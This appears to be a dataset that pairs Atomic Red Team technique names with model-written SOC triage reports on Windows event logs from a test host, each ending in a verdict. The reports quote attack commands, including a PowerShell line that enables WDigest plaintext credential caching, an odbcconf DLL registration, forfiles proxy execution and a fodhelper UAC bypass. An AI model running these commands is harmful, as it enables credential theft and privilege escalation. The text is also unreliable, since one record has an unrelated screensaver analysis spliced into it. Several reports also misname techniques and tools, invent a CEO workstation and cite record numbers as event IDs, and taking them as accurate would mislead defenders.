### **Assessment:**
Based on these indicators, it is highly likely that malicious activity has occurred on this host. The combination of registry modifications via PowerShell scripting, log clearing, suspicious use of administrative tools like `wevtutil`, and evidence of privilege escalation strongly points to malicious intent.

### **Resolution: MALICIOUS**

### **Guidance on How to Proceed:**
1. **Immediate Isolation:** Immediately isolate Server002 to prevent potential lateral movement within the network.
2. **Forensic Investigation:** Conduct a deeper forensic investigation to identify the extent of the compromise.
3. **Review User Accounts:** Check the integrity and permissions of the 'admin_test' account and any related accounts.
4. **Restore Logs:** If backups exist, restore the logs to analyze any further activity that may have been hidden.
5. **Patching and Monitoring:** Ensure all patches are up-to-date and enhance monitoring for any similar IOCs across the network.

Regsvcs Uninstall Method Call Test,"### Detailed Analysis:

#### Suspicious or Anomalous Behavior:

1. **Event Log Clearing (Security Event ID 1102 and System Event ID 104):**
   - Multiple events show the clearing of log files in the Security and System logs. The process responsible for this action is `wevtutil.exe` executed by the user `admin_test`. The clearing of logs can be considered a strong indicator of an attempt to cover up malicious activities, as attackers often clear logs to hide their tracks.

2. **Execution of Known Malicious PowerShell Script:**
   - A PowerShell script execution is noted in the PowerShell logs and corroborated by the Sysmon logs. The script uses base64 encoding and runs a sequence of commands to compile and register a .NET library (T1218.009.dll) using `csc.exe` and `regsvcs.exe`. This activity is suspicious because it involves the execution of a potentially malicious .NET assembly, which fits certain attack techniques used to execute code stealthily (T1218.009 - COM Hijacking).

3. **Suspicious Privilege Escalation Indicators:**
   - The user `admin_test` was involved in processes executing with high integrity levels and handling sensitive operations, further evidenced by `SYSMON` and `Security` logs.
   - Events indicate attempts to access privileged accounts and SIDs such as ""Administrator"" and others, consistent with attempts to enumerate users as part of privilege escalation tactics (Security Event ID 4672).

4. **Process Execution Pattern:**
   - Several process creations are noted that involve core Windows utilities (`wevtutil.exe`, `regsvcs.exe`, `csc.exe`) in a sequence suggestive of their orchestration for a specific operation, likely to execute malicious code.

#### Indicators of Malicious Activity:

- The clearing of Security and System logs in quick succession is a well-known step taken by attackers post-exploitation.
- The encoding and execution of scripts via PowerShell, particularly with activities like the compilation and registration of potentially malicious .NET assemblies, imply an effort to persist or escalate privileges using unmonitored or less-suspicious pathways.
- The existence of COM Surrogate (dllhost.exe) and Distributed Transaction Coordinator (msdtc.exe) running under suspicious conditions.
- Multiple executions of ""wevtutil.exe"" to clear log files (Security, Application, and Powershell), often orchestrated as part of an incident response bypass.

### Assessment & Recommendation:

**Resolution: MALICIOUS**

The logs undeniably indicate malicious activity. The combination of cleared logs, encoded PowerShell scripts that compile and execute potentially malicious assemblies, together with process executions typical of privilege escalation attempts, provides strong evidence of compromise.

**Guidance on How to Proceed:**
1. **Immediate Incident Response Procedures:**
   - Isolate the affected system (Server002) from the network to prevent further propagation or data exfiltration.
   - Collect and preserve additional logs, network traffic captures, and system snapshots for forensic analysis.

This sequence indicates an attempt to disguise an executable as a screensaver, typically an indicator of malware trying to evade detection.

3. **Privilege Use:**
   - The execution of processes with high privileges and the use of `SeDebugPrivilege` by `admin_test` might indicate attempts of escalating privileges or performing actions that require elevated permissions.
   
4. **Suspicious Time Changes:**
   - There are logs related to time adjustments in the system logs. While time adjustments can be legitimate, in conjunction with other activities, they could also indicate attempts to confuse log entries.

5. **Redundant Network-Based Executions:**
   - Instances of network propagation tools like `WaaSMedicSvc` being executed with potentially unwarranted command-line arguments also suggest attempts to exploit the network for lateral movement or further penetration.

**Conclusion and Recommendations:**

- **Resolution:** **MALICIOUS**
  - Given the attempt to clear event logs, execution of suspicious command structures indicative of staging files for malicious purposes, and use of privileged rights, there are strong indicators that the system has been compromised maliciously.

- **Further Actions:**
  - Initiate immediate triage and isolation of the affected host to prevent lateral movement.
  - Conduct a thorough forensic investigation to identify any payloads delivered or other systems potentially affected.
  - Review network logs for any suspicious outbound connections from the affected system.
  - Educate the user `admin_test` regarding safe cybersecurity practices if the activity arises from lack of awareness.
  - Ensure regular monitoring of logs and implement stricter access controls to prevent unauthorized actions in the future.

This conclusion implies direct intervention is required to remediate the system and prevent further compromise."
Enable RDP via Registry (fDenyTSConnections),"Upon reviewing the provided Windows event logs, several potentially significant activities stand out, indicating a serious security concern. Here's a summary of findings:

1. **Log File Clearing**:
   - There are multiple events (`EventID 104`) indicating the clearing of log files across various channels, such as the System and Windows PowerShell channels. This action was performed by a user `admin_test` with high integrity level privileges, suggesting an attempt to cover tracks.

2. **Processes Initiated by Admin Account**:
   - The `wevtutil.exe` command was repeatedly used to clear logs, a behavior not typical for benign use. This utility is often misused by attackers to erase evidence of their activities.
   - The processes `cmd.exe` and `reg.exe` were executed to modify the Windows Registry to change terminal server settings, specifically enabling remote desktop connections (via the `fDenyTSConnections` registry key). This action could signify an attempt to maintain remote access.

3. **Odd Command Lines**:
   - The execution of commands using a high integrity level, particularly those modifying system configurations or clearing logs, is a critical factor indicating potential compromise.

4. **Use of System Utilities**:
   - The use of system utilities (`cmd.exe`, `reg.exe`, `wevtutil.exe`) in a manner consistent with malicious activity aimed at persistence and data cleansing. Furthermore, interactions involving `conhost.exe` associated with suspicious commands also suggest unauthorized tampering.

5. **Privilege Escalation**:
   - `EventID 4672` indicates that special privileges were assigned, which is typical during the administrative or elevated session.
   - Logon events associated with SYSTEM logon IDs and privileges (e.g., `SeDebugPrivilege`) that could be indicative of privilege escalation attempts or system compromise.

**Assessment**:
The combination of cleared logs, suspicious command executions, use of high-integrity level processes, and registry modifications points strongly to the presence of malicious activity. This behavior is consistent with a sophisticated attacker attempting to establish a foothold and cover their tracks after potentially compromising the CEO's workstation or another critical asset on `Server002`.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- **Immediate Actions**:
  - **Isolate the affected system** to prevent further access or lateral movement across the network.
  - **Conduct a full forensic analysis** using an endpoint detection and response (EDR) tool to identify any other indicators of compromise.
  
- **Long-term Actions**:
  - **Reset all associated administrative accounts** and enhance auditing for privileged activities.
  - **Review and strengthen security policies**, particularly surrounding remote access, auditing, and integrity monitoring.
  - **Prevention and Detection**: Implement stronger security measures, such as improved logging, monitoring, real-time alerts, and additional security training for administrators.

Given the presence of activity that suggests a compromise, immediate action is necessary to mitigate potential backdoors and exfiltration risks."
Indirect Command Execution - forfiles.exe,"Upon reviewing the provided logs, several points of interest demand attention regarding potential malicious activity or at least suspicious actions:

1. **Log Cleared Events:**
   - There are multiple events indicating that logs were cleared (`EventID: 1102` on Security log and `EventID: 104` on System log). The user `admin_test` on `SERVER002` is associated with these log clearances. This is a red flag as log clearance can indicate an attempt to remove traces of potentially malicious activity.

2. **Command Line Executions:**
   - The Sysmon logs show repeated execution of `wevtutil.exe` to clear event logs like System, Security, and Windows PowerShell logs. This is highly suspicious as `wevtutil.exe` is a legitimate system tool often used in attacks to clear logs and hide activities.
   - The command-line process initiated by the `admin_test` user: `cmd.exe /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe` seems out of the ordinary. It's trying to execute `forfiles.exe` which can be used to execute commands on specified files. It appears that they were attempting to run this command within the `Windows\system32` directory. This action could potentially indicate an intrusion attempt or execution of hidden scripts.

3. **Windows Defender Status:**
   - Multiple mentions of Windows Defender being turned on, but no evidence of it detecting any threats. Having `MpCmdRun.exe` processes is typical but should also be cross-checked with Defender logs if possible to confirm normal operation.

4. **Security Log Events after Log Clearing:**
   - Post-clearance, there's a noticeable burst of events related to `MicrosoftEdgeUpdate` operations and other normal system processes capturing user account credentials (`EventID: 4798`). These could be legitimate activities, though the timing immediately after a log clearance warrants a closer look into the Edge update processes to check their legitimacy.

5. **Time Manipulation:**
   - The log entries have several events around time adjustments (`EventID: 24` in the System log) which coincide with some of the suspicious activities. Altering time settings can also suggest potential attempts to subvert time tracking of these events.

Based on the analysis, here's the assessment:
- There is clear evidence of actions that attempt to disguise traces of activities by clearing logs, combined with the suspicious execution of potentially malicious command lines. 
- The actions described above indicate an intrusion attempt or compromise.

Therefore, the resolution of this situation should be marked as **MALICIOUS**.

**Guidance on how to proceed:**
- Immediately conduct a further investigation to determine how the `admin_test` account was used to perform the log clearing and issue the suspicious command line.
- Cross-verify the `wevtutil.exe` logs from the point of view of file integrity and actual usage permissions.
- Review network activity logs for unusual outbound connections during the timeframe of these events to look for potential data exfiltration.
- Engage in endpoint threat detection on `Server002` to check for signs of persistence or further exploitation.
- Consider a security incident response to secure the system, including possible isolation, forensic imaging, and full malware scanning of impacted environments.
  
Rectifying vulnerabilities related to privileged user accounts should be prioritized, potentially involving a review and tighter control of permissions across the organization."
System Scope COR_PROFILER,"Upon analysis of the provided Windows event logs, several key observations indicate potentially suspicious and possibly malicious activity:

### Anomalous Behavior:
1. **Clearing of Event Logs:**
   - In the System, Security, and PowerShell logs, there are events (Event ID 104 and 1102) indicating that the event logs were cleared by the user `admin_test`. Clearing logs is often a tactic used to cover up malicious activity.

2. **PowerShell Activity:**
   - There are numerous PowerShell events logged where system environment variables were modified (events with Event ID 600). The command-line details include attempts to modify registry settings related to .NET profiling, using environment variables like `COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH`, with references to an AtomRedTeam weaponization folder usually linked to simulated attack tactics for red team testing (`T1574.012`).

3. **Sysmon Events:**
   - The Sysmon logs indicate execution of the `wevtutil.exe` utility with `cl` (clear logs) parameters on several occasions, matching up with the log-clearing events observed. The same user `admin_test` initiated these actions contextually with high integrity levels, indicative of administrative privileges.

4. **Edge Update Processes:**
   - A sequence of Edge Update events (with processes like `MicrosoftEdgeUpdate.exe`) is observed, typically benign, but they appear regular, potentially suggesting an anomaly when considering the context of the user's activity over a short duration.

### Malicious Indicators:
- The use of `wevtutil cl` to clear logs is suspicious, especially in conjunction with registry modifications using PowerShell designed to enable profiling, likely for an undetected execution or payload delivery.
- The leverage of a known attacker's pattern (like the `AtomicRedTeam` framework in `T1574.012`) is suggestive of possibly malicious intent or at least an unaccounted-for red teaming exercise.

### Assessment:
- The observed activities, particularly the clearing of audit logs, registry modification through PowerShell by a seemingly unauthorized user account (`admin_test`), and alignment with tactics observed from attack simulation frameworks, strongly indicate malicious activity.

### Resolution:
- **MALICIOUS**: The events show clear signs of log tampering, unauthorized system modifications, and the establishment of environmental conditions indicative of potential post-exploitation activity common with sophisticated attacks like APTs or internal threat simulations.
  
### Guidance:
1. **Immediate Remediation:**
   - Isolate the affected system (Server002) from the network to prevent further potential spread of malicious payloads.
   - Initiate a thorough forensic investigation to determine the full extent of the breach and identify any additional affected systems.
   - Conduct a security assessment of user `admin_test` accounts to understand how credentials or privileges might have been compromised or abused.

2. **Post-Incident Actions:**
   - Implement additional monitoring and alerting for similar event log activities.
   - Review and restrict administrative PowerShell executions and secure remote command execution policies.
   - Educate and train staff on recognizing signs of internal and external attacks to improve organizational incident response capability.

WMI Win32_Product Class - Execute Local MSI file with embedded JScript,"Upon reviewing the provided Windows event logs, several points of concern indicate suspicious activity, which warrants further investigation. Below is a detailed analysis based on the logs:

### Analysis:

1. **PowerShell Activity:**
   - Multiple PowerShell events (EventID 600) show the execution of a command using `Invoke-CimMethod` to install an MSI file from a temp directory associated with ""AtomicRedTeam"" (`T1218.007_JScript.msi`). This correlates with a known testing or demonstration framework for security professionals to simulate attack techniques (Atomic Red Team).
   - The use of `Invoke-CimMethod` for installing MSI files is not common in typical usage scenarios and is often associated with attempts to execute code or elevate privileges stealthily.

2. **Event Log Clearing:**
   - Several log entries for `wevtutil.exe` indicate the clearing of the PowerShell operation logs, System logs, and Security logs (`wevtutil.exe cl` commands). This suggests an attempt to cover tracks by an adversary, which is highly indicative of malicious behavior.
   - The `admin_test` user account is repeatedly associated with clearing logs, raising suspicions about account misuse or compromise.

3. **Privilege Escalation Indicators:**
   - The behavior of clearing event logs and executing PowerShell scripts from a temporary directory under an administrative context indicates potential misuse of administrative privileges, suggesting possible privilege escalation or unauthorized privileged actions.

4. **Security Log Event:**
   - The security log with EventID 1102, indicating security log clearing, is a critical alert as it highlights attempts to erase potential indicators of an attack or breach.

5. **Suspicious Application Execution:**
   - The pattern of entries for Microsoft Edge Update does not reveal malicious activity directly but appears excessive in the context and volume, particularly when occurring alongside other suspicious activities.

### Assessment:

The combination of techniques used: executing PowerShell commands to install packages from temp directories, the use of ""AtomicRedTeam"" simulation techniques, and clearing various event logs point to an attempt at simulating or hiding unauthorized actions on the system.

### Resolution:

Given the analysis of the logs, this activity should not be considered normal on any typical user or executive system, particularly a machine associated with entering simulations without clear documentation and approval. The indicators suggest an environment that is either being tested for penetration capabilities unannounced or potentially compromised, specifically tailored with known simulated techniques.

**Resolution: SUSPICIOUS**

### Guidance to Proceed:

1. **Immediate Actions:**
   - Verify with IT operations whether these activities were authorized as part of a scheduled security test or if Atomic Red Team simulations were planned. Ensure that they are not conducted on production or executive systems without explicit approval and coordination.
   - Isolate the system to prevent any further unauthorized activities, particularly if these operations were not sanctioned.

2. **Further Investigation:**
   - Conduct a thorough forensic analysis on `Server002` to check for any additional unauthorized changes or persistence mechanisms potentially installed following the actions described in the logs.
   - Audit other systems for similar patterns to ascertain whether this activity is isolated or part of a broader campaign.
   - Review access logs and credentials associated with the `admin_test` account to check if the account has been misused.

3. **Remediation:**
   - Rotate credentials for the `admin_test` account and enforce credential hygiene across critical systems.
   - Re-establish regular event logging and monitoring. Strengthen alerts on log clearing and PowerShell execution activities.
   - If malicious intent is confirmed or suspected, enhance security awareness with users to prevent similar unauthorized activities in the future.

4. **Follow-Up:**
   - Document and report the findings to executive stakeholders.
   - Evaluate and improve security policies related to PowerShell execution, monitoring, and administrative privileges."
Use Powershell to Modify registry to store logon credentials,"After a thorough review of the Windows event logs you provided, several anomalies and indicators of potentially malicious activity have been observed:

1. **Suspicious Use of Windows PowerShell:**
   - The logs reveal execution of a suspicious PowerShell command that modifies the Windows registry to enable the WDigest ""UseLogonCredentials"" setting: `Set-ItemProperty -Force -Path  'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name  'UseLogonCredential' -Value '1'`.
   - This command is commonly associated with attempts to extract plaintext credentials from memory, indicating potential credential theft (Event ID: 17978, associated with PowerShell log Event IDs: 1043-1048).

2. **Clearing of Security Event Logs:**
   - The security logs indicate that logs were cleared by the user `admin_test` (Security Log Event ID: 1102). This action is typically performed to cover tracks after unauthorized activities.

3. **Event Logs Cleared by admin_test:**
   - Both the System and Windows PowerShell event logs show log clearance (System Log Event IDs: 3566 for the System channel and 3567 for the Windows PowerShell channel). Clearing event logs is a well-known tactic to hide malicious activities.

4. **Repetitive Use of wevtutil:**
   - The tool `wevtutil.exe` was used to clear event logs for several channels consecutively, which is unusual and indicates an attempt to remove traces (Sysmon Event IDs: 17950, 17954, 17966).

5. **Time Sync Manipulation:**
   - There are events indicating time change events (Security Log Event IDs: 4616). Tampering with system time can be a technique used to mess with time-stamped logs for obfuscation.

6. **Execution of suspicious commands with high integrity levels:**
   - Several processes including `wevtutil.exe` and commands accessing system directories ran under a high integrity level, suggesting actions may have been part of an escalation of privileges to perform unauthorized operations (Sysmon Event IDs: Multiple)

### Assessment:
Based on the findings, there's a consistent pattern of behavior aligned with an attempt to cover up suspicious or unauthorized actions and potentially harvest sensitive information through credential theft:

- **PowerShell** commands were used to alter security settings, aligning with known malicious behavior.
- **Clearing of logs** and altered system times suggests an evasion tactic.
- A high volume of EdgeUpdate processes could be a normal update procedure but paired with other suspicious activities might indicate further investigation is needed to rule out its use as a cover.

### Resolution: **MALICIOUS**

### Recommendations:
1. **Conduct a Full Forensic Analysis:**
   - Further investigation should be done into this host to determine the full scope of the malicious activity and any potential data exfiltration or system compromise.

2. **Change All Credentials:**
   - Ensure the credentials that might have been exposed are changed immediately.

3. **Review and Tighten Security Policies:**
   - Review Group Policy and registry settings to prevent the enabling of vulnerable features like WDigest without a legitimate purpose.

4. **Monitor for Further Intrusions:**
   - Increase monitoring for unusual behavior on network and host levels across similar endpoints.

5. **Conduct Incident Response:**
   - Assemble an incident response team to assess the impact and initiate containment measures while collecting evidence.

The indicators strongly suggest that these logs contain evidence of malicious activities aimed at compromising system credentials and covering tracks. Immediate actions are necessary to safeguard the organization’s assets."
Deobfuscate-Decode Files Or Information,"### Analysis of Windows Event Logs

After reviewing the provided event logs, several suspicious activities have been identified that warrant further investigation:

1. **Log Clearing Activity**
   - Multiple log clearing activities were detected. Specifically, events indicate that logs from the System, Security, and Windows PowerShell channels were cleared by the user `admin_test`.
   - Log clearance activities, especially in critical security logs, are often indicative of attempts to hide malicious actions.
   - Event IDs of note: 
     - **Security Log Cleared (EventID: 1102)**
     - **System Log Cleared (EventID: 104)**
     - **Windows PowerShell Log Cleared (EventID: 104)**

2. **Unusual Process Execution**
   - There are multiple instances of `wevtutil.exe`, which is a legitimate utility used for managing Windows event logs, being executed. It's often used by attackers to clear logs or suppress evidence of their activities.
   - Furthermore, the same user, `admin_test`, repeatedly executed `wevtutil.exe` using command-line arguments to clear logs, which amplifies the suspicion.

3. **Privileged Access and Potential Privilege Escalation**
   - The logs reveal that the `admin_test` user was granted a number of privileges (e.g., `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`), as indicated by the event with ID 4672. These privileges allow users to perform administrative actions which are unordinary for standard operation.
   - Logon events (ID 4624) further confirm `admin_test` had successfully logged on using NTLM authentication, with a logon type of 3 (network), suggesting possibly remote access.

4. **Potential Execution of Malicious Commands**
   - There is a potentially malicious command-line execution invoking `cmd.exe` with `certutil`, a commonly abused utility for decoding encoded files into executable form using the temporary path, such as `T1140_calc.txt` and `T1140_calc_decoded.exe`. This is indicative of potentially harvesting or decoding a payload.
   - The command `certutil -encode` and `certutil -decode` being used consecutively can imply an attempt to obfuscate or execute a malicious payload.

### Assessment

The logs provided show a pattern of activity that suggests potential malicious intent:

- Clearing of multiple event logs using `wevtutil.exe` indicates an attempt to cover tracks.
- Multiple executions of high-privilege actions by the same user (`admin_test`) raise alarms.
- The use of `certutil` in conjunction with `cmd.exe` points to potentially suspicious activity involving file manipulation and code execution.

### Resolution

Based on the analysis of the event logs and the nature of activities observed, this case should be classified as:

**MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further unauthorized access or data exfiltration.
   - Conduct a comprehensive forensic analysis to determine the full scope and impact of the compromise.

2. **Further Investigation:**
   - Review additional logs, particularly network activity logs, to identify potential unauthorized access points or lateral movement within the environment.
   - Examine file integrity and any changes, looking for unauthorized changes or installations.

3. **Remediation:**
   - Based on findings, assess which privileges and access may need revocation or adjustment.
   - Strengthen and review security protocols, especially around remote logon and privileged operations.

4. **Post-Incident Actions:**
   - Conduct a thorough post-mortem to understand and mitigate how the initial compromise occurred.
   - Implement more robust monitoring and detection solutions, focusing on activities related to log modification and process executions of high-risk tools like `certutil`.

5. **Employee Training:**
   - Reinforce user and admin training about security policies, especially focusing on recognizing suspicious behaviors and immediately reporting them."
Lolbas ie4uinit.exe use as proxy,"**Detailed Analysis:**

The review of the provided Windows event logs reveals multiple activities that could potentially indicate suspicious behavior. Let's break down the suspicious activities step-by-step:

1. **Wevtutil Execution and Event Logs Clearance:**
   - Numerous executions of `wevtutil.exe` are captured, with command lines specifically targeting the clearance of different event logs (Security, Application, System, and Windows PowerShell).
   - `wevtutil.exe` is used to clear event logs, which is often an indicator of malicious activity as attackers frequently attempt to delete logs to cover their tracks.
   - Application (""EventID: 104"", ""EventID: 1102"") and System logs have entries indicating that logs are being cleared by ""admin_test"" user, and this is corroborated by the presence of the same user's ""ClientProcessId"" in the security log (""EventID: 1102"").

2. **Utilization of File Paths Associated with Testing Tools:**
   - There is a suspicious execution of a known testing tool, `AtomicRedTeam`, specifically in the PowerShell command that emulates attack techniques (not directly visible in the logs but inferred by file names and context).
   - The presence of file paths like `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\...` aligns with these testing kits that are commonly used for penetration testing and Red Teaming exercises.

3. **Execution of Foreign Executables in Temp Directories:**
   - There's evidence of `ie4uinit.exe` execution from the Temp directory which is part of a classic technique (T1218), called ""Signed Binary Proxy Execution"". This strategy often involves executing legitimate binaries to execute malicious payloads.

4. **Rundll32 and Other System-native Executables:**
   - Instances of `rundll32.exe` usage with unusual arguments (e.g., `WininetPlugin.dll`) suggest attempts for dubious activity execution, i.e., potentially loading a malicious DLL as part of an evasive maneuver.
   - Such commands are a hallmark of a technique commonly used for executing code by loading DLLs or executing scripts through legitimate Windows processes to bypass defenses.

5. **Presence of High-Integrity Executions:**
   - Most commands and processes operate at `High` integrity levels, inclusive of PowerShell and other host processes indicating that the user ""admin_test"" has elevated privileges, making these operations more impactful.

6. **Absence of Normal User Activity Logs:**
   - The logs lack normal user activities like interactive logins or desktop patterns which could signify an unauthorized access or illicit administrative actions, especially without the user’s notice.

**Assessment of the Situation:**

The logs contain several strong indications of a possible security compromise:
- Clearing event logs (Security, System, etc.) as demonstrated here is a common technique for attackers post-exploitation to hide evidence of their activities.
- Execution of system applications in ways that are typically not ordinary for standard operations suggest potential abuse or execution of unauthorized commands.
- The presence of what appears to be a testing tool (AtomicRedTeam) in the logs is a red flag as these tools are often employed for controlled malicious activities simulating real attacks (if used legitimately, it should be confirmed within an organization).

**Threats or Risks Identified:**

- High potential of unauthorized access or misuse of administrative credentials.
- Attempted concealment of illicit activities through log clearance.
- Execution of potentially malicious activities under the guise of legitimate Windows processes to evade detection.

**Guidance on How to Proceed:**

- Immediately audit the account ""admin_test"" to determine if the change in behavior aligns with authorized activities.
- Investigate the existence of unauthorized software installations or applications like AtomicRedTeam which may not be sanctioned.
- Conduct a thorough review of all system and network activities associated with the compromised host.
- Strengthen endpoint protection measures and auditing policies to prevent future unauthorized activities, particularly logs tampering and disguised executions.

**Resolution:**

**MALICIOUS** - Considering the comprehensive malicious actions evident across the logs, including event log clearance, unusual system tool executions, and unauthorized data/process manipulation, this analysis concludes with a definitive determination of malicious activity. Immediate action should be initiated to contain, control, and remediate potential security breaches."
Odbcconf.exe - Execute Arbitrary DLL,"## Detailed Analysis

### Summary of Events
The provided logs depict a series of process creations and deletion events, with a significant focus on logs being cleared on a host identified as Server002 and executed by a user `SERVER002\admin_test`. The logs also reveal attempts to clear various event logs including System, Windows PowerShell, and Security channels. Additionally, the logs show some routine activities related to Microsoft Edge Updates.

### Suspicious Activities
1. **Log Clearing Activity:**
   - Multiple channels, including System, Windows PowerShell, and Security logs, being cleared is a direct indicator of potentially malicious activity aimed at covering tracks. This is executed by the user `SERVER002\admin_test`.
   - Event IDs associated with log file clearance across these channels (System Event ID: 104, Security Event ID: 1102) suggest intentional attempts to purge logging trails.

2. **Potentially Malicious Command:**
   - There is an execution of `cmd.exe` with the command `odbcconf.exe /S /A {REGSVR ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.008\\src\\Win32\\T1218-2.dll""}`. This kind of command execution could be indicative of DLL injection or registration, an often-used technique in persistence mechanisms commonly associated with malicious activities.

3. **Wevtutil Commands:**
   - Execution of `wevtutil.exe` to clear specific logs (Sysmon, Application, System, Security) is evident through entries that match known log clearing command patterns.

### Indicators of Malicious Activity
- **Process Creation and File Hashes:**
  - The process trees outlined in the Sysmon logs show suspicious process executions, starting from `wsmprovhost.exe`—a legitimate process that can be hijacked for malicious purposes.
  - Hashes and integrity levels (all marked as `High`) further provide a clue regarding the access level which was abused to perform these actions.

### Assessment of Situation
The patterns observed here, especially the log clearance, use of standard Windows tools for process initiation, and specific command executions (like registering DLLs with `odbcconf.exe`), align with tactics used in post-exploitation scenarios where a perpetrator tries to cover forensic trails. Combining these with high-integrity levels suggests misuse of administrative privileges, potentially indicating a compromised administrative account or insider threat scenario.

### Threats and Risks Identified
- **Risk of Compromise:**
  - The primary risk is the potential compromise of the `SERVER002\admin_test` account, granting it unauthorized control over administrative tasks.
  
- **Data and Logs Tampering:**
  - Evident alteration and clearance of logs could hinder further post-incident analyses, creating challenges in attributing actions to specific entities or identifying the full scope of the attack.

### Guidance on How to Proceed
1. **Immediate User Account Review:**
   - Conduct a review of the `SERVER002\admin_test` account, validating the current credentials and checking for any unauthorized access.
   
2. **Log Retention and Backup:**
   - Implement stricter controls and backups for logs to prevent unauthorized clearances and ensure data integrity for investigative purposes.

3. **Forensic Analysis:**
   - A more in-depth forensic examination on Server002 to determine if any other resources or accounts were affected.
   
4. **Security Policy Audit:**
   - Reassess security policies surrounding privilege escalation and ensure systems are appropriately configured to detect and alert on similar malicious patterns.

### Resolution: MALICIOUS
The investigation concludes the activities demonstrated in the logs are indicative of Malicious activity, exhibiting signs of log manipulation, privilege misuse, and potential command execution aimed at persistence or malicious payload execution. Further investigation and remedial actions are encouraged to mitigate any compromise and enhance the overall security posture."
HTML Smuggling Remote Payload,"### Analysis Summary:

Upon reviewing the provided Windows event logs, the following activities were observed:

1. **System and Security Logs:**
   - **Event Log Clearing:** Logs indicate the clearing of Application, System, and Security logs by the user `admin_test`. The `wevtutil.exe` command has been employed frequently to clear these logs. Clearing event logs is suspicious, as it is a common tactic used by attackers to hide malicious activities.
     - Event ID 104 from System Log and Event ID 1102 from Security Log are associated with log clearing activities.
   - **Highly Privileged Account Usage:** The activity involves a highly privileged account (`admin_test`) and uses processes running with high integrity levels.

2. **Sysmon Logs:**
   - **PowerShell Execution:** The `PowerShell.exe` was executed with unusual command line arguments from a temporary path related to Atomic Red Team's test (T1027.006). This event suggests an attempt to execute or simulate malware behavior for testing or malicious intent.
   - **Browser Redirection/Execution:** Several Microsoft Edge processes were spawned using arguments linked to temporary files created by Atomic Red Team (a well-known red team toolkit for simulating adversary techniques).
   - **Utilities Execution:** Frequent use of native utilities like `wmiprvse.exe`, `wevtutil.exe`, and `conhost.exe` is observed. They are often misused in attacks for tasks such as recon or persistence.
   - **Integrity Levels and Annotations:** Multiple processes executed at a system or app container integrity level are noted, which might indicate attempts to escalate privileges or perform sensitive operations.

3. **Application and PowerShell Logs:**
   - **Repeated Security Product Activation Logs:** Although somewhat expected in operational environments, these might indicate system alterations or initialization post attack.
   - **PowerShell with HTML File:** The PowerShell execution encompassed an HTML file and was not typical or common, pointing to potential execution of script-based payloads.

### Assessment:

Given the log-clearing activities, the misuse of legitimate tools, PowerShell command execution from suspicious paths, and the redirection/utilization of the Edge browser tied to potential offensive actions by Atomic Red Team:
- **Resolution:** **SUSPICIOUS**

### Guidance on Further Steps:

- **Investigate `admin_test` Activity:** Review privileges of the `admin_test` account and any associated user activities immediately before and after the logs were cleared.
- **Endpoint Monitoring:** Ensure that EDR solutions are actively monitoring for any abnormal activities and processes, especially those involving PowerShell and native Windows utilities.
- **Containment and Forensic Analysis:** Consider containing the system as a precaution. Perform forensic analysis focusing on deleted log files and any residual artifacts linked to suspicious executions.
- **Review Network Traffic:** Inspect network traffic logs during the specified times for unusual data exfiltration or connections to known malicious IPs/hosts.
- **Security Policy Review:** Incorporate tighter audit policies to log file modifications and ensure enhanced monitoring of critical systems for proactive threat hunting.

These actions will help in determining if this exhibits an actual compromise and provide further steps to protect company assets and data."
Bypass UAC using Fodhelper - PowerShell,"Upon reviewing the provided logs, several indicators of potentially malicious activity can be identified:

1. **Event Log Clearing:**
   - The Windows event logs (Security, System, and Windows PowerShell) were cleared using `wevtutil.exe`, as indicated by multiple `EventID 104` and `EventID 1102`. The action was performed by the user `admin_test`. Clearing event logs is a red flag for malicious activity as attackers often clear logs to cover their tracks.

2. **Suspicious PowerShell Activity:**
   - There is a PowerShell command execution that involves manipulating the registry to set up what appears to be a ""fodhelper"" bypass for UAC (User Account Control). This technique is commonly used for privilege escalation. The command sets `HKCU:\software\classes\ms-settings\shell\open\command` to launch `cmd.exe` through `fodhelper.exe`, which is a known technique for bypassing UAC.

3. **Privileged Logon and Privilege Use:**
   - An `EventID 4624` with logon type 5 indicates a service logon, and `EventID 4672` shows that the SYSTEM account received a series of high-level privileges. This might not be unusual on its own, but in conjunction with the PowerShell script execution and log clearing, it raises concerns.

4. **Sysmon Logs:**
   - The Sysmon logs confirm the execution of `wevtutil.exe` to clear logs and the PowerShell script execution. The presence of `whoami` and `hostname` execution suggests enumeration activities often associated with an attacker gaining access to a new system.

5. **Microsoft Edge Update Entries:**
   - There are numerous entries related to Microsoft Edge Updates, which generally appear benign. However, given the context of other suspicious activities, these could potentially be leveraged as part of the attack chain.

**Assessment:**
Based on the above findings, the logs show strong indications of compromise, particularly the use of log clearing, UAC bypass, and potentially unauthorized privilege escalation activities via PowerShell. The combination of these activities is consistent with typical attacker behavior when establishing persistence and performing lateral movements within a network.

**Resolution: MALICIOUS**
This is determined to be a malicious activity. Immediate actions should be taken to secure the environment, including:
- Isolating the affected system to prevent further spread.
- Conducting a full forensic investigation to determine the extent of the compromise.
- Reviewing user access and privileges, especially for the user `admin_test`.
- Monitoring for similar activities across the network to identify other potentially compromised hosts."
Lolbin Jsc.exe compile javascript to exe,"**Detailed Analysis of the Logs**

Upon analyzing the provided Windows event logs, several activities stand out that warrant further investigation. I will break down each activity and context to provide a clear assessment.

1. **Log Clearing Activity:**
   - **System and Security Log Clear**: In the system log, there are multiple events (EventID 104) indicating that logs for the ""System"" and ""Windows PowerShell"" channels were cleared by a user named ""admin_test"". Additionally, the security log indicates that its entries were also cleared (EventID 1102) by the same user. Normally, clearing logs is a significant red flag, especially when performed by administrative accounts without clear business justification. This could indicate an attempt to cover tracks of potentially malicious activity.
   
2. **Suspicious Process Execution:**
   - **Wevtutil Usage**: The Sysmon log shows multiple instances of ""wevtutil.exe"" being used to clear event logs for ""Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"". The command-line usage of ""wevtutil cl"" suggests direct manipulation to delete logs, which aligns with the log clearing events noted above. This is indicative of malicious activity attempting to erase traces.
   
